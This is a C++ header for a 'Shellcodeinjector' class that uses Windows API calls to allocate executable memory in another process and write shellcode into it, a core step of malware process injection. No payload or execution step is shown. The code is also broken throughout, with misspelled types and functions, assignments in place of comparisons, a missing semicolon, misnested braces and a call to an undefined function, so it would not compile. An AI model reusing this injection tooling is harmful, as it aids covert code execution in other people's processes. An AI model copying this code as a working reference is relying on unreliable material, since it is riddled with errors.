#pragma once
#include<windows.h>
#include<string>
#include<vector>

using namespace std;

class Shellcodeinjector
{
    public:
         static LPVIOD AllocateRemoteMemory(HANDLE hProcess,size_t size)
         {
            if(hProcess==nullptr || hProcess=INVALID_HANDLE_VALUE)
            {
                Utility::PrintError("Invalid Process Handle");
                return nullptr;
            }
    
        if(size=0)
        {
            Utility::PrintError("Shellcode size is 0");
            return nullptr;
        }
        LPVOID remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        if(!remoteMem)
        {
            Utility::PrintError("VirtualAllocEx failed:" + Utility::GetLastErrorString());

            remoteMem=VirtualAllocEx(hProcess,nullptr,size,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READ);
            if(!remoteMem)
            {
                Utility::PrintError("VirtualAllocEx also failed: "+ Utility::GetLastErrorString());
                return nullptr;
            }
        }
        Utility::PrintSuccess("Allocated "+ to_string(size) + "bytes at 0x" + to_string(reinterpret_cast<unitptr_t>(remoteMem)));
        return remoteMem;


         }
         static bool WriteShellcode(HANDLE hProcess,LPVIOD remoteAddr,const BYTE* shellcode,size_t size)
         {
            if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
            {
                Utility::PrintError("Invalid process handle");
                return false;
            }
            if (remoteAddr==nullptr)
            {
                Utility::PrintErro("Invalid remote address");
                return false;
            }
            if (shellcode==nullptr || size==0)
            {
                Utility::PrintError("Invalid Shellcode");
                return false;
            }

            SIZE_T  bytesWritten=0;

            BOOL success=WriteProcesMemory(hProcess,remoteAddr,shellcode,size,&bytesWritten);

            if(!success)
            {
                Utility::PrintError("Write Process Memory failed: " + Utility::GetLastErrorString());
                return false;
            }
            if(bytesWritten != size)
            {
                Utility::PrintWarning("Wrote " + to_string(bytesWritten) + " bytes expected " + to_string(size));
                return false;
            }
            Utility::PrintSuccess("Wrote " + to_string(bytesWritten) + " bytes at 0x " + to_string(reinterpret_cast<uintptr_t>(remoteAddr)));
            return true;
         }

         static bool FreeRemoteMemory(Handle hProcess,LPVOID remoteAddr)
         {
           if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
            {
                Utility::PrintError("Invalid process handle");
                return false;
            }
            if (remoteAddr==nullptr)
            {
                Utility::PrintErro("Invalid remote address");
                return false;
            }

            BOOL success=VirtualFreeEx(hProcess,reoteAddr,0,MEM_RELEASE)
            {
                if(!success)
                {
                    Utility::PrinteError("Virtual Free Ex failed " + Utility::GetLastErrorString());
                    return false;
                }

                Utility::PrintSuccess("Memory free at 0x " + to_string(reinterpret_cast<uintptr_t>(remoteAddr)));
                return true;
            }
            static LPVOID AllocateandWriteShellcode(HANDLE hProcess, cosnt BYTE* shellcode,size_t size)
            {
                  LPVIOD remoteMem=AllocateRemoteMemory(hProcess,size);
                  if(!remoteMem)
                  {
                    return nullptr;
                  }

                  if(!WriteShellcode(hProcess,remoteMem,shellcode,size))
                  {
                    FreeRemote(hProcess,remoteMem);
                    return nullptr;
                  }
                  return remoteMem;
            }
         }

}